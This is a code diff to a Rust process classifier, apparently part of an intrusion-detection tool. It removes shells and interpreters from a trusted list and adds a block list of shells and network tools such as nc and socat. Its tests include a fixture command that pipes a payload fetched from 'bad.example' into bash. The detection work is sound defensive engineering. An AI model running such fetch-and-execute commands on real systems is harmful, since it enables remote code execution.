@@ -53,15 +53,11 @@ const TRUSTED_PROCS: &[&str] = &[
     "gni_server",
     "systemd",
     "sshd",
-    "python3",
-    "node",
     "pacman",
     "yay",
     "jett",
     "wireguard",
     "wg",
-    "bash",
-    "zsh",
     "tmux",
     "screen",
 ];
@@ -289,6 +285,19 @@ fn read_proc_info(pid: u32) -> Result<ProcessEvent, ProcReadError> {
     })
 }
 
+// Shells, interpreters, and net tools — same list as engine::guard NEVER_FAST_TRUST.
+// These must never get Trusted disposition; behavior goes to the model.
+const NEVER_FAST_TRUST: [&str; 22] = [
+    "bash", "sh", "zsh", "dash", "fish", "ksh", "tcsh",
+    "python", "python3", "perl", "ruby", "node", "php", "lua",
+    "nc", "ncat", "netcat", "socat", "telnet", "ssh", "awk", "xterm",
+];
+
+fn is_never_fast_trust(event: &ProcessEvent) -> bool {
+    let exe_name = event.exe_path.rsplit('/').next().unwrap_or("");
+    NEVER_FAST_TRUST.contains(&event.name.as_str()) || NEVER_FAST_TRUST.contains(&exe_name)
+}
+
 fn classify_event(event: &ProcessEvent) -> ProcessDisposition {
     if is_suspicious(event) {
         ProcessDisposition::Suspicious
@@ -304,6 +313,10 @@ fn classify_event(event: &ProcessEvent) -> ProcessDisposition {
 }
 
 fn is_trusted(event: &ProcessEvent) -> bool {
+    if is_never_fast_trust(event) {
+        return false;
+    }
+
     for trusted in TRUSTED_PROCS {
         if event.name.contains(trusted) || event.cmdline.contains(trusted) {
             return true;
@@ -1008,6 +1021,32 @@ mod tests {
         let event = event("python3", "python3 /tmp/dropper.py", "/tmp/dropper.py");
 
         assert_eq!(classify_event(&event), ProcessDisposition::Suspicious);
+    }
+
+    #[test]
+    fn plain_bash_is_suspicious_not_trusted() {
+        let event = event("bash", "bash", "/usr/bin/bash");
+
+        assert_eq!(classify_event(&event), ProcessDisposition::Suspicious);
+        assert!(!is_trusted(&event));
+    }
+
+    #[test]
+    fn curl_pipe_sh_bash_is_suspicious() {
+        let event = event(
+            "bash",
+            "curl -fsSL https://bad.example/payload | bash",
+            "/usr/bin/bash",
+        );
+
+        assert_eq!(classify_event(&event), ProcessDisposition::Suspicious);
+    }
+
+    #[test]
+    fn git_from_trusted_path_stays_trusted() {
+        let event = event("git", "git status", "/usr/bin/git");
+
+        assert_eq!(classify_event(&event), ProcessDisposition::Trusted);
     }
 
     #[test]
